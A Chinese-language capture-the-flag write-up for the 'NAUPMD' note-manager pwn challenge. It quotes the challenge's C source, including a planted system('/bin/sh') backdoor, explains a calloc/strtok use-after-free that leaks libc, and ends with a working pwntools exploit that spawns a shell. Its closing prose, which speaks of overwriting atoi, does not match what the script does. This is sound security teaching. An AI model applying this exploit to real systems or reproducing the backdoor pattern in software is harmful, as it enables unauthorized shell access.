
# NAUPMD v0.0.0 📒📕📘	
> Author: 堇姬 Naup

## Analyze
他有四種功能
- create note
- delete note
- show note
- backdoor

```c
        choice = read_choice();
        
        if(choice == 1) {
            CREATE_NOTE();
        } else if (choice == 2) {
            DELETE_NOTE();
        } else if (choice == 3) {
            SHOW_NOTES(); 
        } else if (choice == 4) {
            BACKDOOR();  
```

首先分析 delete_note
```c
void DELETE_NOTE() {
    int index;
    printf("Index > ");
    scanf("%d", &index);

    if (index < 0 || index >= NOTE_ARR || NOTE_ARRAY[index] == NULL) {
        puts("[!] Invalid note index.");
        exit(0);
    } else {
        free(NOTE_ARRAY[index]);
        NOTE_ARRAY[index] = NULL;
        printf("Note[%d] deleted successfully.\n", index);
    }
}
```
我們可以輸入一個 index, 他會確認你的 index 跟 note array 是否有越界或是已經建立，
如果可以被釋放，那他會去釋放對應的 chunk，
之後他會去清空 note array 上的 pointer，
所以這部分相當安全，沒有 UAF 的洞

```c
void SHOW_NOTES() {
    int DEBUG = 0;
    if (DEBUG){
        puts("==== NOTES ====");
        for (int i = 0; i < NOTE_ARR; i++) {
            if (NOTE_ARRAY[i] != NULL) {
                printf("[%d] Title: %s | Description: %s\n", i, NOTE_ARRAY[i]->title, NOTE_ARRAY[i]->description);
            }
        }
    }
    else {
        puts("I forget to delete debug...Because I go to watch AVE Mujica.");
    }
}
```

另外一個 function 是 show_note
他需要 debug == 1 才能使用，所以如果不能改道 debug 的值
我們不能使用這個功能

OK，接下來來看 backdoor 

```c
void BACKDOOR(){
    unsigned long your_input;
    unsigned long admin_password = (unsigned long)&atoi;
    void *ptr = NULL;
    char username[0x60];
    char buffer[0x10];

    flush_stdin();
    puts("Verify...");
    printf("Input username > ");
    scanf("%95s",username);
    
    flush_stdin();
    printf("Input password > ");
    if (scanf("%lu", &your_input) != 1) { 
        puts("[!] Input error ...");
        exit(0);
    }

    if (your_input == admin_password) {
        puts("[!] Hi Naup ... This is system debug backdoor.");
        system("/bin/sh");
    } else {
        puts("[!] BAD Hacker !!!!!");
        exit(0);
    }   
}
```

如果我們能輸入正確的密碼，就可以拿到一個 shell，
他的密碼使用的是 atoi 這個 function 的 address，
如果我們能 leaklibc，就代表我們能通過驗證並拿到 shell

所以我們的目標變成了 leaklibc

最後來看這題最重要的 function，create_note
```c
void CREATE_NOTE() {
    
    int input_size;
    printf("Size > ");
    scanf("%d", &input_size);
    
    char* titles = (char*)calloc(1, input_size);

    if (input_size && titles){
        flush_stdin();
        printf("Enter titles > ");
        fgets(titles, input_size, stdin);
        titles[strcspn(titles, "\n")] = '\0';
    }
    
    char* token = strtok(titles, ",");
    int index = 0;

    while (token != NULL) {
        if (index >= NOTE_ARR) {
            puts("[!]Your note space is full... please purchase NAUPMD premium");
            break;
        }

        if (NOTE_ARRAY[index] != NULL) {
            index++;
            continue;
        }

        build_note(token, index);
        index++;

        token = strtok(NULL, ",");
    }
    
    free(titles);
}
```

我們可以輸入大小，它會使用 calloc 配置一塊記憶體。
你可以輸入像是 aa,bb,cc 這樣的標題，
它會建立三個筆記（title 分別是 aa、bb、cc），它使用 strtok 來切割你的輸入

```c
void build_note(const char* title, int index) {
    
    printf("Description for '%s' > ", title);
    struct NOTE* new_note = (struct NOTE*)malloc(sizeof(struct NOTE));
    if (new_note == NULL) {
        puts("[!]Failed to allocate memory for note.");
        exit(0);
    }

    strncpy(new_note->title, title, sizeof(new_note->title) - 1);
    new_note->title[sizeof(new_note->title) - 1] = '\0';

   
    scanf("%15s", new_note->description);

    NOTE_ARRAY[index] = new_note;
    printf("Note[%d] '%s' created successfully.\n", index, title);
}
```

它會把標題儲存到 NOTE 結構裡，接著讓你輸入描述（description）。
它的複製與輸入部分本身沒有任何漏洞。

## Bug
首先，我們需要了解 `calloc` 和 `strtok`。

當 `calloc` 發生錯誤時（例如你輸入的 size == -1），它會回傳 NULL。
我們先暫停一下，回過頭來看看 strtok。

他是一個我覺得相當酷的 function
`char *strtok(char *str, const char *delim)`

我們可以輸入 string and delim，
他會根據 delim, 來去切割我們的 string。
```c
#include <string.h>
#include <stdio.h>
 
int main () {
   char str[80] = "MyGO!!!!! - TomorinIsCute - ILoveRana";
   const char s[2] = "-";
   char *token;
   token = strtok(str, s);
   while( token != NULL ) {
      printf( "%s\n", token );
    
      token = strtok(NULL, s);
   }
   
   return(0);
}

// output :
// MyGO!!!!!
//  TomorinIsCute
//  ILoveRana
```

第一次呼叫 strtok 時，需要傳入字串的指標。
但之後再次呼叫 strtok 時，參數要傳入 NULL。
strtok 會從上一次切割結束的位置繼續切下去。

所以，我們回去閱讀 source code。
```c
    printf("Size > ");
    scanf("%d", &input_size);
    
    char* titles = (char*)calloc(1, input_size);
```

首先，我們輸入一個太大的 size（我這裡使用 0x510）。
接著，標題的指標會被傳給 strtok。
然後它會正常地建立一個筆記。（注意：title 需要輸入 8 個位元組）

```c
free(titles);
```

當 create_note 結束時，它會釋放這塊 chunk，這樣 heap 上就會出現一個 unsorted bin 的 chunk。
接著再次呼叫 calloc。

但這次我們輸入的 size 是 -1。
calloc 會回傳 NULL，因此 titles 就會變成一個 null 指標。

這時再呼叫 strtok，就會變成 `strtok(null, ",")`

`char* token = strtok(titles, ",");`

它會依據你上一次傳給 strtok 的字串來進行處理，
但那個字串所在的記憶體區域已經被釋放了。

所以這部分會從 unsorted bin 的 chunk 中印出字串內容，
而這個 chunk 的 fd 和 bk 欄位裡會包含 libc 的位址。

```c
void build_note(const char* title, int index) {
    
    printf("Description for '%s' > ", title);
```

沒錯！所以我們成功拿到了一個 UAF（Use-After-Free），
並利用它來洩漏 libc 位址。

接著，我們可以計算出 atoi 的位址，然後覆蓋成 backdoor 函數的位址。
當程式再次呼叫 atoi 時，就會跳去執行 backdoor，這樣我們就能拿到 shell 了！ 🎉

## exploit
```py
from pwn import *

r=process("./chal")

r.sendlineafter(b"USER @ NAUPMDshell > ", b'1')
r.sendlineafter(b'Size > ',b'1296')

r.sendlineafter(b'Enter titles > ',b'aaaabbbb')
r.sendlineafter(b'> ',b'a')

r.sendlineafter(b"USER @ NAUPMDshell > ", b'1')
r.sendlineafter(b'Size > ',b'-1')

r.recvuntil(b'Description for \'')

leaklibc = u64(r.recv(6).ljust(8,b'\x00'))
libcbase = leaklibc - 0x21ace0

log.success("leaklibc success!")
log.info("leaklibc: "+hex(leaklibc))
log.info("libcbase: "+hex(libcbase))

r.sendlineafter(b'> ',b'a')

password = libcbase + 0x43640 

r.sendlineafter(b"USER @ NAUPMDshell > ", b'4')
r.sendlineafter(b'Input username > ', b'aaaabbbbccccdddd')
r.sendlineafter(b'Input password > ',str(password).encode())

r.interactive()
```



